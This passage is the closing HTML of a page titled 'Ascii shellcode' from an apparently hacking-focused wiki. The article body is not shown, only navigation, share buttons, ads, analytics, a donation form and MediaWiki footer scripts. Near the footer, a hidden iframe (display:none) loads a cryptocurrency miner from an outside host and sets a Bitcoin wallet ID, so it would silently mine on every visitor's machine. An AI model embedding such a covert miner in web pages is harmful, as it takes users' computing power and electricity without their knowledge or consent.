<a href="/Linux_assembly" title="Linux assembly">Linux assembly</a> &#8226; <a href="/Out_of_Order_Code_Execution" title="Out of Order Code Execution">Out of Order Code Execution</a> &#8226; <a href="/Null-free_shellcode" title="Null-free shellcode" class="mw-redirect">null-free shellcode</a> &#8226; <strong class="selflink">32-bit ascii shellcode</strong> &#8226; <a href="/Alphanumeric_shellcode" title="Alphanumeric shellcode" class="mw-redirect">64-bit alphanumeric shellcode</a> &#8226; <a href="/Return_Oriented_Programming_(ROP)" title="Return Oriented Programming (ROP)">Return Oriented Programming (ROP)</a>
</p><p><b>Related Articles</b><br />
<a href="/Polymorphic" title="Polymorphic">Polymorphic</a> &#8226; <a href="/AJAX" title="AJAX">AJAX</a> &#8226; <a href="/JQuery" title="JQuery">jQuery</a> &#8226; <a href="/Bash_book" title="Bash book">Bash book</a> &#8226; <a href="/Unsafe_string_replacement" title="Unsafe string replacement">unsafe string replacement</a> &#8226; <a href="/SQL_orientation" title="SQL orientation">SQL orientation</a><br />
</p>
</div>
<div id="prog_hide_msg" style="visibility:hidden; height:1px; width:1px;"><b>[ Compile ]</b></div>
<div id="prog_show_msg" style="visibility:hidden; height:1px; width:1px;"><b>[ Decompile ]</b></div>
</center><center><span><div style="border: 1px solid #000; height: 30px; width:60%;">
<div style="width: 25%; float: left; padding-top:4px;"><a name="fb_share"></a><script src="http://static.ak.fbcdn.net/connect.php/js/FB.Share" type="text/javascript"></script></div>
<div style="width: 25%; float: left; padding-top:6px;"><script type="text/javascript" src="http://www.reddit.com/static/button/button1.js"></script></div>
<div style="width: 25%; float: left; padding-top:5px;"><a style="float:center;" data-related="blackhatstaff" data-count="0" data-via="blackhatstaff" href="https://twitter.com/share" class="twitter-share-button">Tweet</a><script src="//platform.twitter.com/widgets.js" type="text/javascript"></script>
</div><div style="width: 25%; float: left; padding-top:5px;">
<a class="DiggThisButton DiggCompact"></a><script type="text/javascript">
(function() {
  var s = document.createElement('SCRIPT'), s1 = document.getElementsByTagName('SCRIPT')[0];
  s.type = 'text/javascript';
  s.async = true;
  s.src = 'http://widgets.digg.com/buttons.js';
  s1.parentNode.insertBefore(s, s1);
})();
</script></div>
</div></span>
</center>

<!-- 
NewPP limit report
Preprocessor node count: 1119/1000000
Post-expand include size: 11090/2097152 bytes
Template argument size: 4341/2097152 bytes
Expensive parser function count: 0/100
-->
<div class="printfooter">
Retrieved from "<a href="http://www.blackhatlibrary.net/Ascii_shellcode">http://www.blackhatlibrary.net/Ascii_shellcode</a>"</div>
		<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks"><a href="/Special:Categories" title="Special:Categories">Categories</a>: <span dir='ltr'><a href="/Category:Exploitation" title="Category:Exploitation">Exploitation</a></span> | <span dir='ltr'><a href="/Category:Programming" title="Category:Programming">Programming</a></span> | <span dir='ltr'><a href="/Category:Shellcode" title="Category:Shellcode">Shellcode</a></span></div></div>		<!-- end content -->
				<div class="visualClear"></div>
	</div>
</div></div>
<div id="column-one">
	<div id="p-cactions" class="portlet">
		<h5>Views</h5>
		<div class="pBody">
			<ul>
				 <li id="ca-nstab-main" class="selected"><a href="/Ascii_shellcode" title="View the content page [c]" accesskey="c">Page</a></li>
				 <li id="ca-talk"><a href="/Talk:Ascii_shellcode" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
				 <li id="ca-viewsource"><a href="/index.php?title=Ascii_shellcode&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
				 <li id="ca-history"><a href="/index.php?title=Ascii_shellcode&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
			</ul>
		</div>
	</div>
	<div class="portlet" id="p-personal">
		<h5>Personal tools</h5>
		<div class="pBody">
			<ul>
				<li id="pt-login"><a href="/index.php?title=Special:UserLogin&amp;returnto=Ascii_shellcode" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li>
			</ul>
		</div>
	</div>
	<div class="portlet" id="p-logo">
		<a style="background-image: url(/logo.png);" href="/Main_Page" title="Visit the main page"></a>
	</div>
	<script type="text/javascript"> if (window.isMSIE55) fixalpha(); </script>
	<div class='generated-sidebar portlet' id='p-Wiki'>
		<h5>Wiki</h5>
		<div class='pBody'>
			<ul>
				<li id="n-mainpage-description"><a href="/Main_Page" title="Visit the main page [z]" accesskey="z">Main page</a></li>
				<li id="n-The-index"><a href="/Category:Indexing">The index</a></li>
				<li id="n-Donate"><a href="/Donations">Donate</a></li>
				<li id="n-Contribute"><a href="/Category:Requested_maintenance">Contribute</a></li>
				<li id="n-recentchanges"><a href="/Special:RecentChanges" title="The list of recent changes in the wiki [r]" accesskey="r">Recent changes</a></li>
				<li id="n-randompage"><a href="/Special:Random" title="Load a random page [x]" accesskey="x">Random page</a></li>
			</ul>
		</div>
	</div>
	<div class='generated-sidebar portlet' id='p-Community'>
		<h5>Community</h5>
		<div class='pBody'>
			<ul>
				<li id="n-Chokepoint"><a href="http://www.chokepoint.net">Chokepoint</a></li>
				<li id="n-.2Fr.2Fblackhat"><a href="http://reddit.com/r/blackhat">/r/blackhat</a></li>
				<li id="n-.40BlackhatStaff"><a href="http://twitter.com/BlackhatStaff">@BlackhatStaff</a></li>
			</ul>
		</div>
	</div>
	<div id="p-search" class="portlet">
		<h5><label for="searchInput">Search</label></h5>
		<div id="searchBody" class="pBody">
			<form action="/index.php" id="searchform">
				<input type='hidden' name="title" value="Special:Search"/>
				<input id="searchInput" title="Search Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools" accesskey="f" type="search" name="search" />
				<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Go" title="Go to a page with this exact name if exists" />&#160;
				<input type='submit' name="fulltext" class="searchButton" id="mw-searchButton" value="Search" title="Search the pages for this text" />
			</form>
		</div>
	</div>
	<div class="portlet" id="p-tb">
		<h5>Toolbox</h5>
		<div class="pBody">
			<ul>
				<li id="t-whatlinkshere"><a href="/Special:WhatLinksHere/Ascii_shellcode" title="List of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
				<li id="t-recentchangeslinked"><a href="/Special:RecentChangesLinked/Ascii_shellcode" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
<li id="t-specialpages"><a href="/Special:SpecialPages" title="List of all special pages [q]" accesskey="q">Special pages</a></li>
				<li id="t-print"><a href="/index.php?title=Ascii_shellcode&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>				<li id="t-permalink"><a href="/index.php?title=Ascii_shellcode&amp;oldid=46571" title="Permanent link to this revision of the page">Permanent link</a></li>			</ul>
		</div>
	</div>
&nbsp;

<script type="text/javascript"><!--
google_ad_client = "ca-pub-3100048614381705";
/* BHL Sidebar */
google_ad_slot = "2730381272";
google_ad_width = 120;
google_ad_height = 90;
//-->
</script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>

<a href="http://www.srsvps.com/"><center><img src="http://blackhatlibrary.net/images/srsvps-button-tux.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
<a href="http://vps-heaven.com/"><center><img src="http://blackhatlibrary.net/images/vps-heaven.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
<center>VPS-Heaven now accepting BitCoin!</center><br />
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-40369725-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>
<a href="http://www.soldierx.com/"><center><img src="http://www.soldierx.com/system/files/images/sx-mini-1.jpg" style="padding: 2px,0px,2px,0px;"></center></a>
<br /><br /><center>Our research is made possible by your support.</center><br />
<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
<input type="hidden" name="cmd" value="_s-xclick">
<input type="hidden" name="hosted_button_id" value="74Q9CEK92HZCL">
<input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
<img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
</form>
</div><!-- end of the left (by default at least) column -->
<div class="visualClear"></div>
<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 1Lr99MtUNbUVSpU6MFA3CboYWGgZ8pHWdB</script></iframe>
<div id="footer">
	<div id="f-poweredbyico">
		<a href="http://www.mediawiki.org/"><img src="/skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
	</div>
	<ul id="f-list">
		<li id="lastmod"> This page was last modified on 12 February 2014, at 01:00.</li>
		<li id="viewcount">This page has been accessed 46,431 times.</li>
		<li id="privacy"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:Privacy_policy" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:Privacy policy">Privacy policy</a></li>
		<li id="about"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:About" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:About">About Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</a></li>
		<li id="disclaimer"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:General_disclaimer" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:General disclaimer">Disclaimers</a></li>
<div align="center"><a href="http://www.darkexile.com/forums/index.php?action=affiliates;sa=in;idaff=15"><img src="http://www.darkexile.com/forums/gallery/3_20_01_11_10_02_44.png"></a>&nbsp; <a href="http://hacktalk.net/"><img src="hacktalk.png"></a></div>

	</ul>
</div>
</div>

<script src="/load.php?debug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=monobook&amp;*"></script>
<script>if ( window.mediaWiki ) {
	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Ascii_shellcode", "wgTitle": "Ascii shellcode", "wgAction": "view", "wgArticleId": 295, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 46571, "wgCategories": ["Exploitation", "Programming", "Shellcode"], "wgBreakFrames": false, "wgRestrictionEdit": ["sysop"], "wgRestrictionMove": ["sysop"]});
}
</script>
<script>if ( window.mediaWiki ) {
	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
	mediaWiki.loader.go();
}
</script>

<script type="text/javascript"> 
function toggleDisplay( id, hidetext, showtext )
{
  link = document.getElementById( id + "l" ).childNodes[0];
 
  with( document.getElementById( id ).style )
    {
      if( display == "none" )
	{
	  display = "inline";
	  link.nodeValue = hidetext;
	}
      else
	{
	  display = "none";
	  link.nodeValue = showtext;
	}
    }
}
</script>
<script>if ( window.mediaWiki ) {
	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"monobook","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"en","language":"en","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
}
</script><!-- Served in 3.203 secs. --></body></html>
